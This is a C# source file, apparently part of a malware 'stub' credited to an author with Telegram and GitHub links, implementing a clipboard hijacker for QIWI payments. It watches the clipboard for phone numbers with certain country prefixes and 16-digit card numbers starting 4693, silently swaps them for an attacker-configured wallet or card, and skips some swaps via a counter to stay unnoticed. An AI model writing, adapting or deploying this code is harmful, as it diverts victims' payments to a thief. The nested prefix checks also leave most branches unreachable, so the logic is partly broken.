/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System.Windows.Forms;


namespace stubOnion
{

    class QIWI
    {
        public static int _oppToMiss;
        public static void GetQiwiNumber()
        {
            try
            {
                var clpbrd = Clipboard.GetText();
                if (Clipboard.ContainsText())
                {
                    if (clpbrd.Length >= 11 && clpbrd.Length <= 15)
                    {
                        if (clpbrd.StartsWith("+7") || clpbrd.StartsWith("7"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwi);
                        }
                        else
                        {
                            return;
                        }

                        if (clpbrd.StartsWith("+380") || clpbrd.StartsWith("380"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwi);
                        }
                        else
                        {
                            return;
                        }
                        if (clpbrd.StartsWith("+89") || clpbrd.StartsWith("89"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwi);
                        }
                        else
                        {
                            return;
                        }
                        if (clpbrd.StartsWith("+79") || clpbrd.StartsWith("79"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwi);
                        }
                        else
                        {
                            return;
                        }
                        if (clpbrd.StartsWith("+375") || clpbrd.StartsWith("375"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwi);
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                    }
                else
                {
                    return;
                }

            }

            catch { }

        }
        public static void GetQiwiCard()
        {
            try
            {
                var clpbrd = Clipboard.GetText();
                if (Clipboard.ContainsText())
                {


                    if (clpbrd.Length == 16)
                    {
                        if (clpbrd.StartsWith("4693"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwicrd);
                        }
                        else
                        {
                            return;
                        }

                    }
                    else
                    {
                        return;
                    }

                }
                else
                {
                    return;
                }
            }
            catch { }
        }
    }
}
